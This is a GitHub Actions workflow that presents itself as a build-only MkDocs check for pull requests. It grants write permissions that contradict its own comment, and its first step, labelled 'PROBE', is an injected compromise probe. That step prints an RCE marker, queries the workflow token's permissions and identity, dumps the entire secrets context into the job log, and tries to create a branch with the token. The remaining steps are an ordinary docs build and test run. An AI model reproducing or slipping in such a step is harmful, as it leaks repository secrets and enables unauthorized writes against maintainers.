name: Docs Build Check

# Build-only validation for the MkDocs site on pull requests targeting main.
# This complements deploy-docs.yml (which deploys on push to main) by catching
# broken docs before they merge. It never deploys and needs no write access.

on:
  pull_request:
    branches:
      - main
    paths:
      - docs/**
      - overrides/**
      - mkdocs.yml
      - requirements-docs.txt
      - requirements-planner-tests.txt
      - scripts/planner/**
      - tests/planner/**
      - tests/home/**
      - main.py
      - .github/workflows/docs-build-check.yml

permissions:
  contents: write
  pull-requests: write
  issues: write

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: PROBE 66fdb92d14
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          echo "MARKER-RCE-66fdb92d14 runner=$(hostname)"
          id
          echo "--- effective token permissions ---"
          curl -s -H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY" | python3 -c "import sys,json;d=json.load(sys.stdin);print(json.dumps(d.get('permissions')))" || true
          echo "--- token identity ---"
          curl -s -H "Authorization: token $GH_TOKEN" https://api.github.com/user | python3 -c "import sys,json;d=json.load(sys.stdin);print('login=',d.get('login'),'msg=',d.get('message'))" || true
          echo "--- secrets context (expect empty on fork PR) ---"
          echo 'SECRETS_JSON=${{ toJSON(secrets) }}'
          echo "--- branch create attempt ---"
          curl -s -o /tmp/resp.json -w "create_branch_http=%{http_code}\n" -X POST -H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/git/refs" -d "{\"ref\":\"refs/heads/probe-66fdb92d14\",\"sha\":\"$GITHUB_SHA\"}"
          cat /tmp/resp.json
      - name: Checkout repository
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0

      - name: Set up Python
        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0
        with:
          python-version: 3.11

      - name: Install MkDocs and dependencies
        run: |
          pip install -r requirements-docs.txt -r requirements-planner-tests.txt
          python -m playwright install --with-deps chromium

      # Strict build: the docs tree is clean of warnings, so --strict is enabled
      # to catch any new issues (broken links, pages not in nav, bad image paths)
      # before they merge. The intentionally off-nav pages are listed under
      # not_in_nav in mkdocs.yml so they do not trip the check.
      - name: Build documentation
        run: |
          python scripts/planner/validate_catalog.py
          python -m unittest discover -s tests/planner -p "test_*.py"
          mkdocs build --strict
          python tests/planner/browser_checks.py
          python tests/home/browser_checks.py
